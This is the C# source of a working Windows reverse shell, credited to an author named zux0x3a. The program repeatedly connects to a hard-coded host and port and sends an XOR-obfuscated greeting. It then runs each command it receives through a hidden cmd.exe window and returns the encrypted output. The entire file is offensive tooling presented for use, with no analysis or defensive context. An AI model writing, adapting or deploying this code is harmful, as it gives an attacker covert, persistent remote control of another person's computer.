
/* 
 * by zux0x3a
 * https://ired.dev / https://0xsp.com 
 * 
 * 
*/ 
using System;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ReverseShell
{
    class Program
    {
        // Set the IP address and port of your netcat server
        private static string HOST = "192.168.33.133"; // remote host
        private static int PORT = 4444; // remote port 



        // Set the key for the XOR encryption
        private static byte[] KEY = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 }; // harder key 

        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    // Connect to the netcat server
                    TcpClient client = new TcpClient(HOST, PORT);
                    Stream stream = client.GetStream();

                    // Create a stream reader and writer to read and write data to the stream
                    StreamReader reader = new StreamReader(stream);
                    StreamWriter writer = new StreamWriter(stream);

                    byte[] message = Encoding.ASCII.GetBytes("WE got a shell (*.*) ");

                    // quick xoring 
                    for (int i = 0; i < message.Length; i++)
                    {
                        message[i] = (byte)(message[i] ^ KEY[i % KEY.Length]);
                    }

                    stream.Write(message, 0, message.Length); // send the HELLO to server 


                    while (true)
                    {
                        // Receive an encrypted message from the server
                        char[] encrypted_message_chars = new char[1024];
                        int chars_received = reader.Read(encrypted_message_chars, 0, encrypted_message_chars.Length);
                        byte[] encrypted_message = new byte[chars_received];
                        for (int i = 0; i < chars_received; i++)
                        {
                            encrypted_message[i] = (byte)encrypted_message_chars[i];
                        }
                        string data = Decrypt(encrypted_message,KEY);
                        string output = ExecuteCommand(data);
                     
                        byte[] encrypted_response = Encrypt(output,KEY);
                        for (int i = 0; i < encrypted_response.Length; i++)
                        {
                            writer.Write((char)encrypted_response[i]);
                        }
                     writer.Flush();
                    }
                }
                catch (Exception)
                {
                    // Sleep for a few seconds before attempting to reconnect
                    System.Threading.Thread.Sleep(2000);
                }
            }
        }

        // Executes a command and returns the output
        private static string ExecuteCommand(string command)
        {
            // Create a process to execute the command
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + command;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            process.StartInfo = startInfo;
            process.Start();

            // Read the output of the command
            string output = process.StandardOutput.ReadToEnd();

            // Return the output
            return output;
        }





       // Encrypts a string using the XOR key and return array of bytes
        private static byte[] Encrypt(string data, byte[] key)
        {
            byte[] message_bytes = Encoding.UTF8.GetBytes(data);

            // XOR the message with the key to get the encrypted message
            byte[] encrypted_message = new byte[message_bytes.Length];
            for (int i = 0; i < message_bytes.Length; i++)
            {
                encrypted_message[i] = (byte)(message_bytes[i] ^ KEY[i % KEY.Length]);
            }

            return encrypted_message;
        }

        // Decrypts a byte array using the XOR key and return string 
        private static string Decrypt(byte[] encrypted_message, byte[] key)
        {
            byte[] decrypted_message = new byte[encrypted_message.Length];
            for (int i = 0; i < encrypted_message.Length; i++)
            {
                decrypted_message[i] = (byte)(encrypted_message[i] ^ KEY[i % KEY.Length]);
            }

            // Convert the decrypted message to a string
            string message = Encoding.UTF8.GetString(decrypted_message);

            return message;

        }
    }
}